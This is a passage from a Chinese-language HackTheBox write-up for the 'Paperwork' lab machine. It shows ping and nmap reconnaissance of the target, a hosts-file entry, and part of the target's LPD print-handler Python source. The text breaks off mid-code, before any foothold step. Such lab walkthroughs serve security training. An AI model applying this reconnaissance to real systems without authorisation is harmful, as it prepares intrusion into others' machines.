@@ -1,0 +1,2096 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Paperwork 靶机 IP：10.129.248.117 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/HTB/Paperwork] └">
+<title>22. Paperwork</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/22.-paperwork/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="22. Paperwork">
+<meta property='og:description' content="Paperwork 靶机 IP：10.129.248.117 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/HTB/Paperwork] └">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/22.-paperwork/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-17T20:20:51&#43;08:00'/><meta property='article:modified_time' content='2026-11-17T20:20:51&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/22.-paperwork/assets/image-20261117112956041.png' />
+<meta name="twitter:title" content="22. Paperwork">
+<meta name="twitter:description" content="Paperwork 靶机 IP：10.129.248.117 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/HTB/Paperwork] └"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/22.-paperwork/assets/image-20261117112956041.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#端口探测">端口探测</a></li>
+      </ol>
+    </li>
+    <li><a href="#立足点">立足点</a></li>
+    <li><a href="#横向移动">横向移动</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/22.-paperwork/">
+                <img src="/p/22.-paperwork/assets/image-20261117112956041_hu16827147259233848356.png"
+                        srcset="/p/22.-paperwork/assets/image-20261117112956041_hu16827147259233848356.png 800w, /p/22.-paperwork/assets/image-20261117112956041_hu5701673745869862808.png 1600w"
+                        width="800" 
+                        height="341" 
+                        loading="lazy"
+                        alt="Featured image of post 22. Paperwork" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/22.-paperwork/">22. Paperwork</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-17</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 9 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="paperwork">Paperwork
+</h1><p><img src="/p/22.-paperwork/assets/image-20261117112956041.png"
+	width="439"
+	height="187"
+	srcset="/p/22.-paperwork/assets/image-20261117112956041_hu6744874747733056646.png 480w, /p/22.-paperwork/assets/image-20261117112956041_hu17807955451905121523.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261117112956041"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="563px"
+	
+></p>
+<p>靶机 IP：10.129.248.117</p>
+<p>连通性测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ping -c <span class="m">4</span> 10.129.248.117
+</span></span><span class="line"><span class="cl">PING 10.129.248.117 <span class="o">(</span>10.129.248.117<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.248.117: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">125</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.248.117: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">115</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.248.117: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">114</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.248.117: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">123</span> ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.129.248.117 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">4</span> packets transmitted, <span class="m">4</span> received, 0% packet loss, <span class="nb">time</span> 3004ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 113.725/119.064/125.179/4.924 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<p><a class="link" href="https://www.qetx.top/article/3adb233d-8731-80a7-893c-ee2723a58256"  target="_blank" rel="noopener"
+    >https://www.qetx.top/article/3adb233d-8731-80a7-893c-ee2723a58256</a></p>
+<p><a class="link" href="https://medium.com/@z9mohamed74/paperwork-hackthebox-write-up-520fd3192f35"  target="_blank" rel="noopener"
+    >https://medium.com/@z9mohamed74/paperwork-hackthebox-write-up-520fd3192f35</a></p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="端口探测">端口探测
+</h3><p>使用 <code>Nmap</code> 进行端口扫描。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -T4 -p1-10000 10.129.248.117
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-17 11:24 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.248.117 <span class="o">(</span>10.129.248.117<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">9997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">1515/tcp open  ifor-protocol
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.10 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -sC -p 22,80,1515 10.129.248.117
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-17 11:25 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> paperwork.htb <span class="o">(</span>10.129.248.117<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.12s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE        VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http           nginx 1.28.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intranet <span class="p">|</span> Document Archiving Service
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.28.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1515/tcp open  ifor-protocol?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   TerminalServer, TerminalServerCookie: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Archive_Printer is ready and printing.
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 21.69 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>SERVICE</th>
+<th>NOTES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>OpenSSH 10.0p2</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>nginx</td>
+</tr>
+<tr>
+<td>1515</td>
+<td>?</td>
+<td>后续可知是LPD</td>
+</tr>
+</tbody>
+</table></div>
+<p>访问 <code>http://10.129.248.117</code> 会被重定向到 <code>paperwork.htb</code>。</p>
+<p>在 <code>hosts</code> 文件中添加这条规则。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.248.117 paperwork.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="立足点">立足点
+</h2><p><img src="/p/22.-paperwork/assets/image-20261117113453857.png"
+	width="2224"
+	height="1238"
+	srcset="/p/22.-paperwork/assets/image-20261117113453857_hu15507650744262414580.png 480w, /p/22.-paperwork/assets/image-20261117113453857_hu15978728565990653100.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261117113453857"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="431px"
+	
+></p>
+<p><code>Intake Protal</code> 录入门户。</p>
+<p>维护通知：后台打印服务程序 PRN-ARCHIVE-01 的管理控制台目前已下线。可通过旧版网关继续使用手动录入功能。</p>
+<p>系统配置：</p>
+<ul>
+<li>协议：RFC 1179（LPR 打印协议标准）</li>
+<li>目标队列：<code>archive_intake</code></li>
+<li>内部处理程序</li>
+</ul>
+<p>使用须知：远程任务提交必须符合档案索引的业务规范。不带有效标识的提交任务，将无法被旧版录入处理器处理。</p>
+<p>这个内部处理程序 <code>paperwork-archive-v1.02</code> 点击即可下载。下载后解压得到一个 <code>.py</code> 文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">VALID_QUEUE</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;LPD_QUEUE&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 继承自Thread</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">LpdHandler</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sock</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">sock</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;[lpd-</span><span class="si">{</span><span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">]&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># 线程入口方法 线程启动后自动执行 run</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 最多读取1024字节</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span> <span class="k">return</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># 第一个字节作为LPD协议命令码</span>
+</span></span><span class="line"><span class="cl">            <span class="n">command</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># 字节为0x02 进入handle_print_job</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">handle_print_job</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">command</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Archive_Printer is ready and printing.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s2"> Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
